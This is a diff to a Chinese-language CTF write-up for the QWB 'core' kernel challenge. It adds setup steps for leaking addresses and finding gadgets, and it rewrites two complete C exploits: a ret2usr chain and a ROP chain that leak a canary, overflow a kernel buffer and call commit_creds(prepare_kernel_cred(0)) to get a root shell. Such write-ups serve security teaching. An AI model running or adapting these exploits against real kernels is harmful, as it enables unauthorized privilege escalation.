@@ -22,6 +22,10 @@ qemu-system-x86_64 \
 ```
 程序开启了kaslr
 
+解压文件系统
+```
+cpio -idmv < core.cpio
+```
 允许普通用户读取内核函数地址,需要在init中添加
 ```
 echo 0 > /proc/sys/kernel/kptr_restrict
@@ -29,7 +33,7 @@ echo 1 >/proc/sys/kernel/perf_event_paranoid
 ```
 然后再创建镜像文件
 ```
-find . | cpio -o --format=newc > ../rootfs.img
+find . | cpio -o --format=newc > ../core.cpio
 ```
 查看下保护
 ```c
@@ -117,7 +121,7 @@ int __fastcall core_read(__int64 a1)
     v2 = (__int64 *)((char *)v2 + 4);
   }
   strcpy((char *)&v6, "Welcome to the QWB CTF challenge.\n");
-  LODWORD(v4) = copy_to_user(v1, (char *)&v6 + off, 0x40LL);// v1和off由我们指定,所以这里存在一个0x40byte的地址泄露
+  LODWORD(v4) = copy_to_user(v1, (char *)&v6 + off, 0x40LL);// v1和off由我们指定,所以这里存在一个leak
   if ( v4 )
     __asm { swapgs }
   else
@@ -138,7 +142,44 @@ int __fastcall core_read(__int64 a1)
 ```
 setsid /bin/cttyhack setuidgid 0 /bin/sh
 ```
+查看模块基地址
+```
+/ # lsmod | grep core
+core 16384 0 - Live 0xffffffffc0098000 (O)
+```
+添加symbol
+```
+add-symbol-file ./core.ko 0xfc031d000
+```
+在vmlinux中查看函数地址偏移,其中内核的默认基地址是0xffffffff81000000
+```
+from pwn import *
+elf = ELF('./core/vmlinux')
+print "commit_creds",hex(elf.symbols['commit_creds']-0xffffffff81000000)
+print "prepare_kernel_cred",hex(elf.symbols['prepare_kernel_cred']-0xffffffff81000000)
+```
+运行后看到我们的偏移
+```
+commit_creds 0x9c8e0
+prepare_kernel_cred 0x9cce0
+```
+在qemu中查看实际地址
+```
+/ # more /proc/kallsyms | grep commit_creds
+ffffffffa2a9c8e0 T commit_creds
+/ # more /proc/kallsyms | grep prepare_kernel_cred
+ffffffffa2a9cce0 T prepare_kernel_cred
+```
+相减得到vmlinux基地址`0xffffffffa2a00000`
 
+使用ropper进行gadget查找
+```
+ropper --file vmlinux --nocolor > result.txt
+```
+或者
+```
+ROPgadget --binary vmlinux > 1.txt
+```
 ### 利用
 提权函数
 ```
@@ -153,122 +194,130 @@ commit_creds(prepare_kernel_cred(0));
 ```
 最终exp
 ```
+//kernel 4.15.8
+//ret2usr.c
+//gcc ret2usr.c -o ret2usr -w -static
 #include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/stat.h>
 #include <fcntl.h>
-#include <string.h>
-#include <stdint.h>
-
-unsigned long user_cs, user_ss, user_eflags,user_sp	;
-void save_stats() {
-	asm(
-		"movq %%cs, %0\n"
-		"movq %%ss, %1\n"
-		"movq %%rsp, %3\n"
-		"pushfq\n"
-		"popq %2\n"
-		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
- 		:
- 		: "memory"
- 	);
+#include <unistd.h>
+int fd;
+unsigned long user_cs, user_ss, user_eflags,user_sp;
+size_t commit_creds_addr,prepare_kernel_cred_addr;
+ 
+void core_read(char *buf){              //函数封装
+    ioctl(fd,0x6677889B,buf);
+    //printf("[*]The buf is:%x\n",buf);
 }
 
-void get_shell(void){
+void change_off(long long v1){          //函数封装
+    ioctl(fd,0x6677889c,v1);
+}
+
+void core_write(char *buf,int a3){      //函数封装
+    write(fd,buf,a3);
+}
+
+void core_copy_func(long long size){    //函数封装
+    ioctl(fd,0x6677889a,size);
+}
+
+void shell(){                           //起一个shell
     system("/bin/sh");
 }
-//eip =(unsigned long long) get_shell;
 
-#define KERNCALL __attribute__((regparm(3)))
-void* (*prepare_kernel_cred)(void*) KERNCALL ;
-void (*commit_creds)(void*) KERNCALL ;
-void payload(){
-      commit_creds(prepare_kernel_cred(0));
+void save_stats(){                      //保存用户状态
+    asm(
+        "movq %%cs, %0\n"
+        "movq %%ss, %1\n"
+        "movq %%rsp, %3\n"
+        "pushfq\n"
+        "popq %2\n"
+        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
+        :
+        : "memory"
+    );
 }
 
-void setoff(int fd,int off){
-	ioctl(fd,0x6677889C,off);
+void get_root(){                                    //这里就是从用户态运行了提权
+    char* (*pkc)(int) = prepare_kernel_cred_addr;
+    void (*cc)(char*) = commit_creds_addr;
+    (*cc)((*pkc)(0));
 }
 
-void core_read(int fd,char *buf){
-	ioctl(fd,0x6677889B,buf);
-}
+int main(){
+    int ret,i;
+    char buf[0x100];
+    size_t vmlinux_base,core_base,canary;
+    size_t commit_creds_offset = 0x9c8e0;               //通过vmlinx可以找到
+    size_t prepare_kernel_cred_offset = 0x9cce0;        //通过vmlinx可以找到
+    size_t rop[0x100];
+    save_stats();
+    fd = open("/proc/core",O_RDWR);
+    change_off(0x40);
+    core_read(buf);
+    /*
+    for(i=0;i<0x40;i++){
+    printf("[*] The buf[%x] is:%p\n",i,*(size_t *)(&buf[i]));
+    }
+    */
+    vmlinux_base = *(size_t *)(&buf[0x20]) - 0x1dd6d1;      //通过leak计算出基地址
+    core_base = *(size_t *)(&buf[0x10]) - 0x19b;            //通过leak计算出基地址
+    canary = *(size_t *)(&buf[0]);
+    printf("[*]canary:%p\n",canary);
+    printf("[*]vmlinux_base:%p\n",vmlinux_base);
+    printf("[*]core_base:%p\n",core_base);
+    for(i = 0;i < 8;i++){
+        rop[i] = 0x66666666;                //填充
+    }
+    rop[i++] = canary;                      //canary
+    rop[i++] = 0x0;                         //junk
+    rop[i++] = (size_t)get_root;            //跳到用户的位置执行了提权
+    rop[i++] = core_base + 0xd6;            //swapgs; pop rbp; ret
+    rop[i++] = 0;                           //junk
+    rop[i++] = vmlinux_base + 0x50ac2;      //iretq; ret;
+    rop[i++] = (size_t)shell;               //起一个shell
+    rop[i++] = user_cs;
+    rop[i++] = user_eflags;
+    rop[i++] = user_sp;
+    rop[i++] = user_ss;
 
-void core_copy(int fd , unsigned long long len){
-	ioctl(fd, 0x6677889A,len);
-}
-
-int main(void){
-	save_stats() ; 
-	unsigned long long buf[0x40/8];
-	memset(buf,0,0x40);
-	unsigned long long canary ;
-	unsigned long long module_base ;
-	unsigned long long vmlinux_base ; 
-	unsigned long long iretq ;
-	unsigned long long swapgs ;
-	unsigned long long rop[0x30];
-	memset(buf,0,0x30*8);
-	int fd = open("/proc/core",O_RDWR);
-	if(fd == -1){
-		printf("open file error\n");
-		exit(0);
-	}
-	else{
-		printf("open file success\n");
-	}
-	printf("[*] buf: 0x%p",buf);
-	setoff(fd,0x40);
-	core_read(fd,buf);
-	canary = buf[0];
-	module_base =  buf[2] - 0x19b;
-	vmlinux_base = buf[4] - 0x16684f0;
-	printf("[*] canary: 0x%p",canary);
-	printf("[*] module_base: 0x%p",module_base);
-	printf("[*] vmlinux_base: 0x%p",vmlinux_base);
-	commit_creds = vmlinux_base + 0x9c8e0;
-	prepare_kernel_cred = vmlinux_base + 0x9cce0;
-	iretq = vmlinux_base + 0x50ac2;
-	swapgs  = module_base + 0x0d6;
-	rop[8] = canary ; 
-	rop[10] = payload;
-	rop[11] = swapgs;
-	rop[12] = 0;
-	rop[13] = iretq ;
-	rop[14] = get_shell ; 
-	rop[15] = user_cs;
-	rop[16] = user_eflags;
-	rop[17] = user_sp;
-	rop[18] = user_ss;
-	rop[19] = 0;
-	write(fd,rop,0x30*8);
-	core_copy(fd,0xf000000000000000+0x30*8);
+    core_write(rop,0x100);
+    core_copy_func(0xf000000000000100);
+    return 0;
 }
 
 ```
 或者
 ```
+//rop.c
+//gcc rop.c -o poc -w -static
 #include <stdio.h>
-#include <unistd.h>
-#include <stdlib.h>
 #include <fcntl.h>
-#include <string.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <sys/ioctl.h>
-#include <pthread.h>
-void setoff(int fd,long long size){		//不同的调用方法
-	ioctl(fd,0x6677889C,size);
+#include <unistd.h>
+int fd;
+void core_read(char *buf){                      //函数封装
+    ioctl(fd,0x6677889B,buf);
+    //printf("[*]The buf is:%x\n",buf);
 }
-void core_read(int fd,char *buf){		//不同的调用方法
-	ioctl(fd,0x6677889b,buf);
+
+void change_off(long long v1){                  //函数封装
+    ioctl(fd,0x6677889c,v1);
 }
-void core_copy_func(int fd,long long size){		//不同的调用方法
-	ioctl(fd,0x6677889a,size);
+
+void core_write(char *buf,int a3){              //函数封装
+    write(fd,buf,a3);
 }
+
+void core_copy_func(long long size){            //函数封装
+    ioctl(fd,0x6677889a,size);
+}
+
+void shell(){                                   //起一个shell
+    system("/bin/sh");
+}
+
 unsigned long user_cs, user_ss, user_eflags,user_sp	;
-void save_stats() {							//保存一下用户态的数据
+void save_stats(){                              //保存用户状态
 	asm(
 		"movq %%cs, %0\n"
 		"movq %%ss, %1\n"
@@ -281,86 +330,56 @@ void save_stats() {							//保存一下用户态的数据
  	);
 }
 
-void get_shell(){
-	system("/bin/sh");
-}
-
 int main(){
-	int fd ;
-	size_t tmp ;
-	char buf[0x50];
-	size_t shellcode[0x100];
-	size_t vmlinux_base,canary,module_core_base;
-	size_t commit_creds =  0x9c8e0;
-	size_t prepare_kernel_cred = 0x9cce0;
-	save_stats();							//首先保存用户态数据
-	fd = open("/proc/core",O_RDWR);
-	if(fd < 0 ){
-		printf("Open /proc/core error!\n");
-		exit(0);
-	}
-	setoff(fd,0x40);
-	core_read(fd,buf);
-	/*	for test
-	for(int i = 0;i<8;i++){
-		tmp = *(size_t *)(&buf[i*8]);
-		printf("[%d] %p\n",i,tmp);
-	}
-	*/
-	size_t pop_rdi = 0x000b2f;
-	size_t push_rax =  0x02d112;
-	size_t swapgs = 0x0d6;
-	size_t iret ;
-	size_t xchg = 0x16684f0;
-	size_t call_rax=0x40398;
-	size_t pop_rcx = 0x21e53;
-	size_t pop_rbp = 0x3c4; //: pop rbp ; ret
-	size_t pop_rdx = 0xa0f49 ;//: pop rdx ; ret
-	size_t mov_rdi_rax_call_rdx = 0x01aa6a;
-	vmlinux_base = (*(size_t *)(&buf[4*8])-0x1dd6d1 );
-	printf("[+] vmlinux_base:%p\n",vmlinux_base);
-	canary = (*(size_t *)(&buf[0]));
-	printf("[+] canary:%p\n",canary);
-	module_core_base = (*(size_t *)(&buf[2*8])-0x19b );
-	printf("[+] module_core_base:%p\n",module_core_base);
-	commit_creds+=vmlinux_base;
-	prepare_kernel_cred += vmlinux_base;
-	pop_rdi += vmlinux_base;
-	push_rax += vmlinux_base;
-	swapgs += module_core_base ;
-	iret = 0x50ac2+vmlinux_base;
-	xchg += vmlinux_base;
-	call_rax += vmlinux_base;
-	pop_rcx += vmlinux_base;
-	mov_rdi_rax_call_rdx +=vmlinux_base;
-	pop_rdx += vmlinux_base;
-	printf("[+] commit_creds:%p\n",commit_creds);
-	printf("[+] prepare_kernel_cred:%p\n",prepare_kernel_cred);
-	//shellcode[0]=shellcode[0]
-	//shellcode[] =
-	for(int i=0;i<9;i++){
-		shellcode[i]=canary;
-	} 
-	shellcode[9] = (*(size_t *)(&buf[1]) );
-	shellcode[10] = pop_rdi;	//0xdeadbeefdeadbeef;
-	shellcode[11] = 0;
-	shellcode[12] = prepare_kernel_cred;
-
-	shellcode[13] = pop_rdx;
-	shellcode[14] = pop_rcx;
-	shellcode[15] = mov_rdi_rax_call_rdx;
-	shellcode[16] = commit_creds;
-	shellcode[17] = swapgs;
-	shellcode[18] = shellcode;
-	shellcode[19] = iret;
-	shellcode[20] = (size_t)get_shell;
-	shellcode[21] = user_cs;
-	shellcode[22] = user_eflags;
-	shellcode[23] = user_sp;
-	shellcode[24] = user_ss;
-	
-	write(fd,shellcode,25*8);
-	core_copy_func(fd,0xf000000000000000+25*8);
-
+    int ret,i;
+    char buf[0x100];
+    size_t vmlinux_base,core_base,canary;
+    size_t commit_creds_addr,prepare_kernel_cred_addr;
+    size_t commit_creds_offset = 0x9c8e0;           //通过vmlinux找出
+    size_t prepare_kernel_cred_offset = 0x9cce0;    //通过vmlinux找出
+    size_t rop[0x100];
+    save_stats();
+    fd = open("/proc/core",O_RDWR);
+    change_off(0x40);
+    core_read(buf);
+    /*
+    for(i=0;i<0x40;i++){
+    printf("[*] The buf[%x] is:%p\n",i,*(size_t *)(&buf[i]));
+    }
+    */
+    vmlinux_base = *(size_t *)(&buf[0x20]) - 0x1dd6d1;      //通过leak计算出基地址
+    core_base = *(size_t *)(&buf[0x10]) - 0x19b;            //通过leak计算出基地址
+    prepare_kernel_cred_addr = vmlinux_base + prepare_kernel_cred_offset;
+    commit_creds_addr = vmlinux_base + commit_creds_offset;
+    canary = *(size_t *)(&buf[0]);
+    printf("[*]canary:%p\n",canary);
+    printf("[*]vmlinux_base:%p\n",vmlinux_base);
+    printf("[*]core_base:%p\n",core_base);
+    printf("[*]prepare_kernel_cred_addr:%p\n",prepare_kernel_cred_addr);
+    printf("[*]commit_creds_addr:%p\n",commit_creds_addr);
+    //junk
+    for(i = 0;i < 8;i++){
+        rop[i] = 0x66666666;
+    }
+    rop[i++] = canary;                      //canary
+    rop[i++] = 0;                           //rbp(junk)
+    rop[i++] = vmlinux_base + 0xb2f;        //pop_rdi_ret;
+    rop[i++] = 0;                           //rdi
+    rop[i++] = prepare_kernel_cred_addr;     //在内核空间运行了prepare_kernel_cred(0)
+    rop[i++] = vmlinux_base + 0xa0f49;      //pop_rdx_ret
+    rop[i++] = vmlinux_base + 0x21e53;      //pop_rcx_ret       此时rdx的值是这个
+    rop[i++] = vmlinux_base + 0x1aa6a;      //mov rdi, rax ; call rdx      这时上一个函数结果到了rdi,然后call rdx
+    rop[i++] = commit_creds_addr;
+    rop[i++] = core_base + 0xd6;            //swapgs; pop rbp; ret
+    rop[i++] = 0;                           //rbp(junk)
+    rop[i++] = vmlinux_base + 0x50ac2;      //iretp_ret
+    rop[i++] = (size_t)shell;               //起一个shell
+    rop[i++] = user_cs;
+    rop[i++] = user_eflags;
+    rop[i++] = user_sp;
+    rop[i++] = user_ss;
+    core_write(rop,0x100);
+    core_copy_func(0xf000000000000100);
+    return 0;
 }
 ```
